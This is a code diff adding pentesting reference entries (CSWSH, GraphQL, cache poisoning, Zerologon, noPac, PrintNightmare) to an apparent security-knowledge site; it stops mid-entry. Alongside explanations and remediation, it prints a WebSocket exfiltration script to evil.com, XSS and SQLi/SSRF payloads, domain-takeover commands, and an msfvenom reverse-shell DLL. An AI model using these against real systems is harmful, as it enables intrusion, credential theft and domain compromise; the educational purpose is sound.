@@ -1229,6 +1229,62 @@ var VULNS = [
     category: "Cross-Site & Client-Side",
     vulns: [
       {
+        id: "cswsh",
+        name: "Cross-Site WebSocket Hijacking (CSWSH)",
+        severity: "High",
+        ref: "https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking",
+        description: "A WebSocket handshake authenticated only by cookies and lacking origin/CSRF checks can be opened from an attacker's page, hijacking the victim's channel.",
+        brief: "Cross-Site WebSocket Hijacking is CSRF applied to the WebSocket handshake. A WebSocket connection begins life as an ordinary HTTP upgrade request, and like any cross-site request the browser attaches the victim's cookies to it. If the server authenticates the handshake using only those cookies — with no unpredictable CSRF token and no validation of the Origin header — then a page the attacker controls can open a WebSocket back to the target from the victim's browser, and the resulting connection is fully authenticated as the victim.\n\nOnce the channel is open, the attacker's JavaScript can both send messages (performing actions as the victim) and, crucially, read the messages the server sends back — because, unlike a classic CSRF where the response is blocked by the same-origin policy, the attacker's own script owns this WebSocket and receives everything over it. Depending on what the WebSocket API exposes, that means exfiltrating chat history, account data, tokens, or live events, and driving any action the socket supports.\n\nThe root cause is the missing combination of a CSRF token on the handshake and strict server-side Origin validation. It maps to WSTG-CLNT-10 (WebSockets).",
+        quickReference: [
+          { label: "Spot the risk", cmd: "WebSocket handshake with a session Cookie but no CSRF token and no Origin check" },
+          { label: "Test Origin handling", cmd: "replay the Upgrade request with Origin: https://evil.com — still 101 Switching Protocols?" },
+          { label: "PoC (attacker page)", cmd: "var ws=new WebSocket('wss://target/chat'); ws.onmessage=e=>fetch('//evil/?d='+btoa(e.data));" },
+          { label: "Tooling", cmd: "Burp Suite (WebSockets history + repeater)" }
+        ],
+        sections: [
+          { title: "Root Cause & Concepts", type: "notes", items: [
+            "The WebSocket opening handshake is an HTTP request, so the browser sends the victim's cookies with it cross-site — exactly like CSRF.",
+            "If the server authenticates the handshake on cookies alone, with no per-handshake CSRF token and no Origin validation, an attacker page can establish an authenticated socket as the victim.",
+            "Unlike classic CSRF, the attacker's script owns the socket and can READ server messages, so this leaks data as well as performing actions.",
+            "The two missing controls are an unpredictable token tied to the session on the handshake, and strict server-side checking of the Origin header.",
+            "It corresponds to OWASP WSTG-CLNT-10 (Testing WebSockets)."
+          ]},
+          { title: "Where to Look", type: "notes", items: [
+            "Any ws:// or wss:// endpoint (find them in JS and the browser's network tab, or Burp's WebSockets history).",
+            "The handshake request: is it authenticated by a Cookie, and is there any CSRF token or nonce in it?",
+            "Whether the server validates the Origin header on the handshake (test with a forged Origin).",
+            "What the WebSocket protocol exposes — read actions (chat/history/account data) and write actions (state changes)."
+          ]},
+          { title: "Testing & Exploitation", type: "commands", commands: [
+            { label: "1. Capture and inspect the handshake", cmd: "# in Burp, find the Upgrade request:\nGET /chat HTTP/1.1\nUpgrade: websocket\nCookie: session=...\n# note: is there a CSRF token? is Origin checked?" },
+            { label: "2. Test Origin validation", cmd: "# replay the handshake with a foreign Origin:\nOrigin: https://evil.com\n# a 101 Switching Protocols response = Origin not enforced -> hijackable" },
+            { label: "3. Build the attacker-page PoC", cmd: "<script>\n var ws = new WebSocket('wss://target.com/chat');\n ws.onopen = () => ws.send('{\"action\":\"getHistory\"}');\n ws.onmessage = e => fetch('https://evil.com/collect?d=' + btoa(e.data));\n</script>\n// victim visits -> their authenticated socket data is exfiltrated to you" },
+            { label: "4. Drive actions as the victim", cmd: "// the same socket can send state-changing messages:\nws.send(JSON.stringify({action:'sendMessage', to:'attacker', body:'...'}));" }
+          ]},
+          { title: "Impact", type: "table", columns: ["Capability", "Result"], rows: [
+            ["Read server messages", "Exfiltrate chat, account data, tokens, live events"],
+            ["Send messages", "Perform any action the WebSocket API supports as the victim"],
+            ["Full channel control", "Account takeover where the socket exposes sensitive actions"],
+            ["No response blocking", "Unlike CSRF, the attacker reads responses directly"]
+          ]},
+          { title: "Tools Used", type: "table", columns: ["Tool", "Purpose"], rows: [
+            ["Burp Suite", "Inspect/replay the handshake, test Origin, and read WebSocket traffic"],
+            ["Browser + attacker page", "Host the JavaScript PoC that opens the cross-site socket"]
+          ]},
+          { title: "References", type: "references", items: [
+            { label: "PortSwigger — Cross-site WebSocket hijacking", url: "https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking" },
+            { label: "OWASP WSTG — Testing WebSockets", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets" }
+          ]},
+          { title: "Remediation", type: "notes", items: [
+            "Validate the Origin header on the WebSocket handshake server-side against a strict allow-list, and reject unexpected origins.",
+            "Require an unpredictable, session-bound CSRF token on the handshake (e.g. a token in the URL or a first-message challenge) in addition to the cookie.",
+            "Prefer session tokens sent in a way that is not automatically attached cross-site, or use SameSite cookies as defence-in-depth.",
+            "Re-authenticate or authorise sensitive WebSocket actions rather than trusting the connection for the whole session.",
+            "Treat messages received over the socket as untrusted input and apply the same authorization checks as the REST API."
+          ]}
+        ]
+      },
+      {
         id: "xss",
         name: "Cross-Site Scripting (XSS)",
         severity: "High",
@@ -2886,6 +2942,129 @@ var VULNS = [
     category: "Server-Side",
     vulns: [
       {
+        "id": "graphql",
+        "name": "GraphQL Vulnerabilities",
+        "severity": "High",
+        "ref": "https://portswigger.net/web-security/graphql",
+        "description": "GraphQL APIs expose a single flexible endpoint whose introspection, nested queries, and per-resolver authorization are frequently mishandled.",
+        "brief": "GraphQL is a query language for APIs where the client asks for exactly the data it wants from a single endpoint (commonly /graphql). That flexibility shifts a lot of logic to the server and creates a distinct vulnerability profile. Introspection, if left enabled, hands an attacker the entire schema — every type, field, and mutation — which maps the attack surface instantly; even when disabled, field suggestions and tools like Clairvoyance can reconstruct it.\n\nThe heavyweight issues are authorization and resource abuse. Because a single query can traverse relationships, broken object- and function-level authorization (BOLA/BFLA) is common — one resolver checks access while a nested field does not, letting you read or mutate objects you should not. Deeply nested or recursive queries can exhaust server resources (a denial-of-service unique to GraphQL), and query batching/aliasing lets an attacker send hundreds of operations in one request to bypass rate limits (brute-forcing logins or 2FA). Classic injection still applies wherever a resolver passes an argument into SQL, a command, or an internal request (SSRF).\n\nGraphQL is increasingly the back-end for modern apps and mobile clients, so it is a high-value, under-tested surface.",
+        "quickReference": [
+          { "label": "Introspection query", "cmd": "POST /graphql  {\"query\":\"{__schema{types{name fields{name}}}}\"}" },
+          { "label": "Find the endpoint", "cmd": "common: /graphql /api/graphql /graphql/console /v1/graphql ; or GraphiQL/Playground UIs" },
+          { "label": "Batching for brute force", "cmd": "send an array of operations or aliased fields in one request to dodge rate limits" },
+          { "label": "Recover a hidden schema", "cmd": "clairvoyance / field-suggestion abuse when introspection is disabled" }
+        ],
+        "sections": [
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "A single endpoint answers arbitrary client-shaped queries, so authorization must be enforced per field/resolver — a check on the top-level query does not cover nested objects.",
+            "Introspection is a built-in feature that returns the whole schema; left enabled in production it hands attackers a complete map of types, fields, and mutations.",
+            "Nested and recursive queries can be made arbitrarily expensive, and batching/aliasing packs many operations into one HTTP request — both defeat naive rate limiting and enable DoS and brute force.",
+            "Resolvers that pass arguments into SQL, OS commands, or internal URLs reintroduce SQLi/command injection/SSRF behind the GraphQL layer.",
+            "GraphQL does not define authentication/authorization — it is the implementer's job, which is why BOLA/BFLA are so common."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "The GraphQL endpoint: /graphql, /api/graphql, /graphql/console, /v1/graphql, and GraphiQL/Apollo Playground UIs.",
+            "Whether introspection is enabled (the __schema query returns data).",
+            "Object/field access: request objects and nested relationships belonging to other users (BOLA), and privileged mutations as a low-priv user (BFLA).",
+            "Mutations and query arguments that reach a database, command, or outbound request (injection/SSRF).",
+            "Rate-limited actions (login, OTP, password reset) that can be hit via batching or aliases."
+          ]},
+          { "title": "Testing & Exploitation", "type": "commands", "commands": [
+            { "label": "1. Dump the schema via introspection", "cmd": "curl -s https://target/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"query{__schema{types{name kind fields{name}}}}\"}'\n# full introspection query maps every type and mutation" },
+            { "label": "2. If introspection is off, reconstruct it", "cmd": "clairvoyance -o schema.json https://target/graphql\n# abuses field-suggestion error messages to rebuild the schema" },
+            { "label": "3. Test broken authorization (BOLA/BFLA)", "cmd": "# request another user's object by id, or call an admin mutation as a normal user:\n{ user(id: 1337) { email ssn } }\nmutation { promoteUser(id: 1337, role: \"admin\") { id } }" },
+            { "label": "4. Batching to bypass rate limits", "cmd": "# aliases pack many attempts into one request:\n{ a: login(user:\"x\",pass:\"1\"){token} b: login(user:\"x\",pass:\"2\"){token} ... }\n# or send a JSON array of operations" },
+            { "label": "5. Injection / SSRF via arguments", "cmd": "# a resolver argument reaching a query or fetch:\n{ product(id: \"1 OR 1=1\") { name } }\n{ fetchUrl(url: \"http://169.254.169.254/latest/meta-data/\") }" }
+          ]},
+          { "title": "Vulnerability Classes", "type": "table", "columns": ["Class", "Detail"], "rows": [
+            ["Introspection exposure", "Full schema disclosure maps the attack surface"],
+            ["Broken object/function auth (BOLA/BFLA)", "Access other users' objects or privileged mutations"],
+            ["Nested-query DoS", "Deep/recursive queries exhaust server resources"],
+            ["Batching / alias abuse", "Many operations per request bypass rate limits (brute force)"],
+            ["Injection via resolvers", "SQLi, command injection, or SSRF behind a resolver argument"],
+            ["Information disclosure", "Verbose errors and field suggestions leak schema/data"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite (+ InQL extension)", "Introspection, schema browsing, and crafting/batching queries"],
+            ["clairvoyance", "Reconstruct the schema when introspection is disabled"],
+            ["graphw00f", "Fingerprint the GraphQL engine (guides engine-specific tests)"],
+            ["GraphiQL / Playground", "Interactive query consoles when exposed"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "PortSwigger — GraphQL API vulnerabilities", "url": "https://portswigger.net/web-security/graphql" },
+            { "label": "OWASP — GraphQL Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Disable introspection and the GraphiQL/Playground UI in production (or restrict them to authenticated internal users).",
+            "Enforce authorization in every resolver — object- and field-level — not just at the top-level query; use the data layer, not the query shape, to decide access.",
+            "Add query cost analysis / depth and complexity limits and timeouts to stop expensive nested queries (DoS).",
+            "Rate-limit by operation, and cap batch size / disable aliased duplication so batching cannot bypass limits on sensitive actions.",
+            "Treat resolver arguments as untrusted input — parameterise queries and validate anything used in a command or outbound request.",
+            "Return generic errors and disable field suggestions so the schema cannot be reconstructed."
+          ]}
+        ]
+      },
+      {
+        "id": "web-cache-poisoning",
+        "name": "Web Cache Poisoning",
+        "severity": "High",
+        "ref": "https://portswigger.net/web-security/web-cache-poisoning",
+        "description": "An attacker gets a harmful response stored in a shared cache under a normal cache key, so it is then served to every other user.",
+        "brief": "Web Cache Poisoning abuses the gap between what a cache uses to identify a response (the cache key — typically method + host + path + maybe a few query parameters) and what the application actually uses to build that response (which may also include unkeyed inputs like certain headers). If an attacker can influence the response through an input that is NOT part of the cache key, they can send a request that looks identical (by key) to a normal user's request but produces a malicious response — and the cache stores that malicious response and serves it to everyone who requests the same key.\n\nThe classic unkeyed inputs are headers such as X-Forwarded-Host, X-Forwarded-Scheme, X-Host, and X-Forwarded-For, which apps reflect into absolute URLs, script/link tags, or redirects. Poison one of these and the cached page can point every visitor at attacker-controlled script (stored XSS at scale), redirect them, or break the page (denial of service). A related variant, cache deception, tricks the cache into storing a victim's authenticated page under a key the attacker can then request.\n\nBecause one request can affect every subsequent user of a cached resource, impact scales from an individual bug to a site-wide, persistent compromise, which is why it is rated high.",
+        "quickReference": [
+          { "label": "Spot an unkeyed header", "cmd": "GET /?cb=1  with  X-Forwarded-Host: evil.com  -> reflected in the response?" },
+          { "label": "Confirm it caches", "cmd": "look for X-Cache: hit/miss, Age, and a cache-control that allows storage" },
+          { "label": "Find unkeyed inputs", "cmd": "Burp Param Miner -> 'Guess headers' / 'Guess parameters'" },
+          { "label": "Poison + verify", "cmd": "send the malicious request, then fetch the clean URL and confirm you get the poisoned response" }
+        ],
+        "sections": [
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "A cache serves a stored response to any request that matches its cache KEY; the vulnerability is an input that changes the response but is NOT part of that key (an 'unkeyed input').",
+            "The attacker sends a request that is identical by key to a victim's but carries a malicious unkeyed input; the cache stores the resulting bad response and replays it to everyone.",
+            "Common unkeyed inputs: X-Forwarded-Host/Scheme, X-Host, X-Forwarded-For, and other headers the app reflects into URLs, scripts, or redirects (overlaps with Host Header Injection).",
+            "Impact depends on the reflection: cached XSS (site-wide), cached open redirect, or a cached broken/erroring page (DoS).",
+            "Cache deception is the inverse — making a cache store a victim's private/authenticated response under a key the attacker can read."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "Sites behind a CDN or reverse-proxy cache (look for X-Cache, Age, CF-Cache-Status, Via headers).",
+            "Responses that reflect request headers into absolute URLs, canonical tags, <script>/<link> src, or redirects.",
+            "Cacheable resources — static-looking pages, JS/CSS, and pages served with cache-control that permits storage.",
+            "Parameters and headers the cache ignores for keying but the app still consumes (find them with Param Miner).",
+            "Path and extension quirks that make dynamic pages look cacheable (for cache deception)."
+          ]},
+          { "title": "Testing & Exploitation", "type": "commands", "commands": [
+            { "label": "1. Add a cache buster and probe headers", "cmd": "# unique param so you don't poison real users while testing:\nGET /?cachebuster=1 HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com\n# is evil.com reflected in the response body/headers?" },
+            { "label": "2. Confirm the response is cacheable", "cmd": "# resend the same request and look for a cache hit:\n# X-Cache: hit , Age: >0 , CF-Cache-Status: HIT\n# if it caches AND reflects an unkeyed input, it is poisonable" },
+            { "label": "3. Discover unkeyed inputs at scale", "cmd": "# Burp Param Miner: 'Guess headers' and 'Guess parameters'\n# flags inputs that change the response but not the cache key" },
+            { "label": "4. Craft the poison (e.g. cached XSS)", "cmd": "GET /?cachebuster=2 HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com/\"></script><script>alert(document.domain)</script>\n# the cached page now serves attacker script to every visitor of that key" },
+            { "label": "5. Verify, then report (do not leave it poisoned)", "cmd": "# fetch the clean URL in a separate client and confirm the poisoned response,\n# then let the cache expire / request a purge — never leave production poisoned" }
+          ]},
+          { "title": "Impact & Attack Chain", "type": "table", "columns": ["Step", "Action", "Result"], "rows": [
+            ["1", "Find an unkeyed input the app reflects", "Candidate poisoning vector"],
+            ["2", "Confirm the response is cached", "The response can be stored and replayed"],
+            ["3", "Send a request poisoning that input", "Malicious response cached under a normal key"],
+            ["4", "Other users request the same key", "They receive the poisoned response"],
+            ["5", "Cached XSS / redirect / DoS", "Site-wide, persistent impact"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite", "Manual header/parameter tampering and cache-behaviour analysis"],
+            ["Param Miner (Burp)", "Discover unkeyed headers and parameters automatically"],
+            ["Browser / second client", "Verify a poisoned response is served to other users"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "PortSwigger — Web cache poisoning", "url": "https://portswigger.net/web-security/web-cache-poisoning" },
+            { "label": "PortSwigger research — Practical Web Cache Poisoning", "url": "https://portswigger.net/research/practical-web-cache-poisoning" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Include every input that affects the response in the cache key, or strip/normalise unkeyed inputs (X-Forwarded-Host, etc.) before they reach the application.",
+            "Do not build absolute URLs, scripts, or redirects from request headers (see Host Header Injection); use a configured canonical base URL.",
+            "Mark genuinely dynamic or user-specific responses as uncacheable (Cache-Control: no-store/private) so they are never stored in a shared cache.",
+            "Avoid caching responses that reflect request input; where caching is required, cache only truly static content.",
+            "For cache deception, normalise paths/extensions and never serve authenticated content from a cacheable key."
+          ]}
+        ]
+      },
+      {
         "id": "http-request-smuggling",
         "name": "HTTP Request Smuggling",
         "severity": "High",
@@ -3638,6 +3817,232 @@ var VULNS = [
   {
     category: "Active Directory",
     vulns: [
+      {
+        id: "zerologon",
+        name: "Zerologon (CVE-2020-1472)",
+        severity: "Critical",
+        ref: "https://www.secura.com/blog/zero-logon",
+        description: "A cryptographic flaw in Netlogon lets an unauthenticated attacker reset a domain controller's machine-account password and seize the whole domain.",
+        brief: "Zerologon is a critical flaw in the Netlogon Remote Protocol (MS-NRPC). Netlogon's session authentication used AES in CFB8 mode with a fixed all-zero initialisation vector, and because of how CFB8 behaves, a plaintext of all zeros produces an all-zero ciphertext roughly 1 in 256 times. An attacker who can reach a domain controller over the network (no credentials at all) simply retries the ComputeNetlogonCredential handshake with zeroed values until it succeeds, then abuses the same weakness to call NetrServerPasswordSet2 and set the DC's own machine-account (DC$) password to empty in Active Directory.\n\nFrom there the attacker authenticates as the DC computer account with an empty password and performs a DCSync to dump every domain credential — including the krbtgt key and Domain Admin hashes — which is full domain compromise. The attack is unauthenticated, works in seconds, and needs only network access to a DC.\n\nA critical operational caveat: setting the DC$ password only changes it in AD, not in the DC's local registry, so the two desync and the DC can break (replication, auth). A responsible test must restore the original machine-account password immediately after proving impact.",
+        quickReference: [
+          { label: "Check if vulnerable", cmd: "nxc smb <dc-ip> -u '' -p '' -M zerologon" },
+          { label: "Exploit (set DC$ pw empty)", cmd: "python3 set_empty_pw.py DC01 <dc-ip>   (zerologon PoC)" },
+          { label: "DCSync as the DC account", cmd: "secretsdump.py -no-pass -just-dc 'DOMAIN/DC01$@<dc-ip>'" },
+          { label: "RESTORE the password (critical)", cmd: "python3 reinstall_original_pw.py DC01 <dc-ip> <hex-from-secretsdump>" }
+        ],
+        sections: [
+          { title: "Root Cause", type: "notes", items: [
+            "Netlogon secure-channel authentication used AES-CFB8 with an IV hard-coded to 16 zero bytes, which is cryptographically invalid (the IV must be random).",
+            "With a zero IV, an all-zero plaintext encrypts to all-zero ciphertext about 1 in 256 times, so an attacker can forge a valid-looking client credential just by retrying with zeros.",
+            "The same session then calls NetrServerPasswordSet2 to set the DC computer account's AD password to an empty value — Netlogon did not require the change to be bound to a real secret.",
+            "No credentials are needed and the exchange is unauthenticated; only network reachability to a DC's Netlogon RPC endpoint is required."
+          ]},
+          { title: "Preconditions", type: "notes", items: [
+            "Network access to an unpatched domain controller (the August 2020 patch, enforced February 2021, fixes it).",
+            "No domain credentials required — this is a pre-auth attack.",
+            "You must know (or resolve) the DC's NetBIOS computer name for the Netlogon call."
+          ]},
+          { title: "Exploitation", type: "commands", commands: [
+            { label: "1. Confirm the DC is vulnerable", cmd: "# NetExec module (safe check, does not change the password):\nnxc smb <dc-ip> -u '' -p '' -M zerologon\n# or the tester PoC:\npython3 zerologon_tester.py DC01 <dc-ip>" },
+            { label: "2. Set the DC machine-account password to empty", cmd: "python3 set_empty_pw.py DC01 <dc-ip>\n# the DC$ account now authenticates with an empty NT hash" },
+            { label: "3. DCSync the domain as the DC account", cmd: "secretsdump.py -no-pass -just-dc 'CORP/DC01$@<dc-ip>'\n# dumps krbtgt + all user hashes = full domain compromise" },
+            { label: "4. RESTORE the original password (mandatory)", cmd: "# secretsdump prints the DC's old pwdLastSet hashes; use them to re-set:\npython3 reinstall_original_pw.py DC01 <dc-ip> <hexkey>\n# failing to restore desyncs AD vs the local registry and can break the DC" }
+          ]},
+          { title: "Impact & Attack Chain", type: "table", columns: ["Step", "Action", "Result"], rows: [
+            ["1", "Spray the zeroed Netlogon handshake", "Authenticated Netlogon session (unauth attacker)"],
+            ["2", "NetrServerPasswordSet2 to empty", "DC$ machine-account password reset in AD"],
+            ["3", "Auth as DC$ with empty hash, DCSync", "krbtgt + Domain Admin hashes dumped"],
+            ["4", "Pass-the-hash / Golden Ticket", "Full, persistent domain compromise"],
+            ["5", "Restore DC$ password", "Avoids breaking the DC (responsible testing)"]
+          ]},
+          { title: "Tools Used", type: "table", columns: ["Tool", "Purpose"], rows: [
+            ["NetExec (zerologon module)", "Safe vulnerability check"],
+            ["Zerologon PoC (set_empty_pw / reinstall)", "Exploit and restore the machine-account password"],
+            ["Impacket secretsdump", "DCSync as the DC account to dump hashes"]
+          ]},
+          { title: "References", type: "references", items: [
+            { label: "Secura — Zerologon whitepaper", url: "https://www.secura.com/blog/zero-logon" },
+            { label: "Microsoft — CVE-2020-1472", url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472" }
+          ]},
+          { title: "Remediation", type: "notes", items: [
+            "Apply the Microsoft patch — August 2020 added secure-RPC support and February 2021 enforced it; fully patched DCs are not exploitable.",
+            "Ensure enforcement mode is on so DCs require secure Netlogon RPC from all machine accounts.",
+            "Monitor for NetrServerPasswordSet2 anomalies and sudden machine-account password changes on DCs (event 4742).",
+            "If exploited during a test, restore the DC machine-account password immediately to prevent an outage."
+          ]}
+        ]
+      },
+      {
+        id: "nopac",
+        name: "noPac / sAMAccountName Spoofing (CVE-2021-42278 & CVE-2021-42287)",
+        severity: "Critical",
+        ref: "https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing",
+        theory: "theory/2026-08-18-kerberos.html",
+        description: "Any domain user can chain two Kerberos flaws to impersonate a domain controller and obtain Domain Admin.",
+        brief: "noPac chains two 2021 vulnerabilities that, together, let any ordinary authenticated domain user escalate to Domain Admin. The default Machine Account Quota lets a normal user create a computer account; CVE-2021-42278 is the absence of validation that a machine account's sAMAccountName ends in '$'; and CVE-2021-42287 is a KDC behaviour where, if it cannot find the account named in a TGS request, it retries by appending '$'.\n\nThe attacker creates a machine account, renames its sAMAccountName to exactly match a domain controller's name (without the trailing '$'), and requests a TGT. They then rename their account back (or delete it) so the DC's name no longer resolves to it, and present the TGT in an S4U2self request. The KDC, unable to find the now-missing name, appends '$', matches the real domain controller, and issues a service ticket impersonating a privileged user (e.g. Administrator) to a service on the DC — which the attacker uses to DCSync the domain.\n\nThe result is a single-command path from a low-privileged domain account to full domain compromise, which is why it is rated critical.",
+        quickReference: [
+          { label: "Check & exploit (netexec)", cmd: "nxc smb <dc> -u user -p pass -M nopac" },
+          { label: "Exploit (noPac.py)", cmd: "noPac.py CORP/user:pass -dc-ip <dc> -dc-host DC01 --impersonate administrator -use-ldap" },
+          { label: "Get a shell / dump", cmd: "noPac.py CORP/user:pass ... --impersonate administrator -dump" },
+          { label: "Precondition", cmd: "MachineAccountQuota > 0 (default 10) and unpatched DC" }
+        ],
+        sections: [
+          { title: "Root Cause", type: "notes", items: [
+            "CVE-2021-42278: Active Directory did not enforce that a computer account's sAMAccountName ends in '$', so it can be renamed to a DC's name.",
+            "CVE-2021-42287: when the KDC cannot find the account named in a TGS/S4U request, it retries the lookup with '$' appended — matching the real DC after the attacker's account is renamed away.",
+            "Default ms-DS-MachineAccountQuota (10) lets any authenticated user create the machine account needed to start the chain.",
+            "Combined, the KDC issues a service ticket as a privileged principal to a DC service — effectively impersonating the domain controller."
+          ]},
+          { title: "Preconditions", type: "notes", items: [
+            "Any valid domain user's credentials (no special privileges).",
+            "ms-DS-MachineAccountQuota greater than 0 (default 10) so the attacker can add a computer account.",
+            "A domain controller missing the November 2021 patches for both CVEs."
+          ]},
+          { title: "Exploitation", type: "commands", commands: [
+            { label: "1. Check the quota and patch state", cmd: "# quota:\nnxc ldap <dc> -u user -p pass -M maq\n# noPac has a scanner mode:\nnoPac.py CORP/user:pass -dc-ip <dc> -dc-host DC01 -scan" },
+            { label: "2. Run the chain to impersonate administrator", cmd: "noPac.py CORP/user:pass -dc-ip <dc> -dc-host DC01 \\\n  --impersonate administrator -use-ldap\n# creates a machine account, spoofs the DC name, requests the ticket" },
+            { label: "3. Act with the impersonation ticket", cmd: "# noPac can drop a shell or dump directly:\nnoPac.py CORP/user:pass -dc-ip <dc> -dc-host DC01 --impersonate administrator -dump\n# or export the ccache and secretsdump with -k -no-pass" },
+            { label: "Alternative: NetExec module", cmd: "nxc smb <dc> -u user -p pass -M nopac" }
+          ]},
+          { title: "Impact & Attack Chain", type: "table", columns: ["Step", "Action", "Result"], rows: [
+            ["1", "Create a machine account (quota)", "Attacker-controlled computer object"],
+            ["2", "Rename sAMAccountName to the DC's name", "Account impersonates the DC name (CVE-2021-42278)"],
+            ["3", "Request a TGT, then rename/delete the account", "TGT for a now-missing name"],
+            ["4", "S4U2self; KDC appends '$' and matches the real DC", "Service ticket as Administrator to the DC (CVE-2021-42287)"],
+            ["5", "Use the ticket to DCSync", "Full domain compromise"]
+          ]},
+          { title: "Tools Used", type: "table", columns: ["Tool", "Purpose"], rows: [
+            ["noPac.py (Charlie Bromberg / sam-the-admin)", "Automates the full sAMAccountName-spoofing chain"],
+            ["NetExec (nopac module)", "Check and exploit from the CME/NXC workflow"],
+            ["Impacket (secretsdump, getST)", "Ticket handling and DCSync after impersonation"]
+          ]},
+          { title: "References", type: "references", items: [
+            { label: "The Hacker Recipes — sAMAccountName spoofing", url: "https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing" },
+            { label: "Microsoft — CVE-2021-42278", url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278" },
+            { label: "Microsoft — CVE-2021-42287", url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287" }
+          ]},
+          { title: "Remediation", type: "notes", items: [
+            "Apply the November 2021 patches for both CVE-2021-42278 and CVE-2021-42287 on all domain controllers.",
+            "Set ms-DS-MachineAccountQuota to 0 so ordinary users cannot create machine accounts.",
+            "Monitor for machine-account creation and rename events (4741/4743) and sAMAccountNames that collide with DC names.",
+            "Restrict who can join computers to the domain via delegated rights rather than the global quota."
+          ]}
+        ]
+      },
+      {
+        id: "printnightmare",
+        name: "PrintNightmare (CVE-2021-1675 / CVE-2021-34527)",
+        severity: "Critical",
+        ref: "https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare",
+        description: "A Print Spooler flaw lets an authenticated user load a malicious driver DLL as SYSTEM — local privilege escalation and remote code execution, including on domain controllers.",
+        brief: "PrintNightmare is a family of vulnerabilities in the Windows Print Spooler service. The RpcAddPrinterDriverEx / AddPrinterDriverEx operation lets a client install a printer driver, and the flaw is that an authenticated, low-privileged user can point it at an attacker-supplied DLL — hosted locally or on a remote SMB/WebDAV share — which the Spooler then loads and executes with SYSTEM privileges.\n\nCVE-2021-1675 was first classified as a local privilege escalation and later found to allow remote code execution; CVE-2021-34527 is the RCE tracking the remote vector. Because the Print Spooler runs on virtually every Windows host — crucially including domain controllers by default — any domain user who can reach the Spooler RPC/SMB interface can gain SYSTEM on that host. On a DC, SYSTEM is domain compromise.\n\nIts impact (any-user-to-SYSTEM, remotely, on DCs) and the ubiquity of the Spooler service make it a critical, widely exploited vulnerability.",
+        quickReference: [
+          { label: "Host the malicious driver DLL", cmd: "smbserver.py share /path/to/dll -smb2support   (or a WebDAV share)" },
+          { label: "Exploit (impacket fork)", cmd: "python3 CVE-2021-1675.py CORP/user:pass@<target> '\\\\\\\\attacker\\\\share\\\\evil.dll'" },
+          { label: "Exploit (C#)", cmd: "SharpPrintNightmare.exe C:\\evil.dll \\\\attacker\\share\\evil.dll" },
+          { label: "Check Spooler is reachable", cmd: "rpcdump.py @<target> | grep -i spool   (MS-RPRN / MS-PAR)" }
+        ],
+        sections: [
+          { title: "Root Cause", type: "notes", items: [
+            "The Print Spooler's RpcAddPrinterDriverEx lets a client supply a driver path; the flaw is insufficient privilege and path validation, so a normal user can make the SYSTEM-level Spooler load an arbitrary DLL.",
+            "The DLL can be local or on a remote UNC share (\\\\attacker\\share\\evil.dll), giving both local privilege escalation and remote code execution.",
+            "The Spooler runs as SYSTEM and is enabled by default on workstations, servers, and domain controllers — so the blast radius is enormous.",
+            "CVE-2021-1675 (LPE, then RCE) and CVE-2021-34527 (RCE) are the two tracked identifiers for the same Spooler weakness."
+          ]},
+          { title: "Preconditions", type: "notes", items: [
+            "Any authenticated domain user (for the remote vector) or local user (for LPE).",
+            "The Print Spooler service running and reachable on the target (MS-RPRN over RPC/SMB, or MS-PAR).",
+            "A share the target can reach to host the DLL, or a local DLL path for the LPE case."
+          ]},
+          { title: "Exploitation", type: "commands", commands: [
+            { label: "1. Build a payload DLL and host it", cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f dll -o evil.dll\nsmbserver.py -smb2support share ./   # anonymous share hosting evil.dll" },
+            { label: "2. Trigger the driver load (remote RCE)", cmd: "python3 CVE-2021-1675.py CORP/user:pass@<target> '\\\\attacker\\share\\evil.dll'\n# cube0x0 impacket fork; the Spooler loads evil.dll as SYSTEM" },
+            { label: "3. Local privilege escalation variant", cmd: "SharpPrintNightmare.exe C:\\path\\evil.dll\n# loads a local DLL as SYSTEM on the current host" },
+            { label: "4. Confirm the Spooler endpoint first", cmd: "rpcdump.py @<target> | grep -iE 'MS-RPRN|MS-PAR|spoolss'" }
+          ]},
+          { title: "Impact & Attack Chain", type: "table", columns: ["Step", "Action", "Result"], rows: [
+            ["1", "Find a host with the Spooler exposed", "Candidate target (often a DC)"],
+            ["2", "Host a malicious driver DLL", "Payload reachable over SMB/WebDAV"],
+            ["3", "Call RpcAddPrinterDriverEx at the DLL", "Spooler loads it as SYSTEM"],
+            ["4", "SYSTEM shell on the host", "LPE, or RCE on a remote host"],
+            ["5", "If the host is a DC", "Domain compromise"]
+          ]},
+          { title: "Tools Used", type: "table", columns: ["Tool", "Purpose"], rows: [
+            ["CVE-2021-1675.py (cube0x0)", "Remote exploitation via the impacket fork"],
+            ["SharpPrintNightmare", "C# local/remote exploitation"],
+            ["Impacket (smbserver, rpcdump)", "Host the DLL share and enumerate the Spooler endpoint"],
+            ["msfvenom", "Generate the payload DLL"]
+          ]},
+          { title: "References", type: "references", items: [
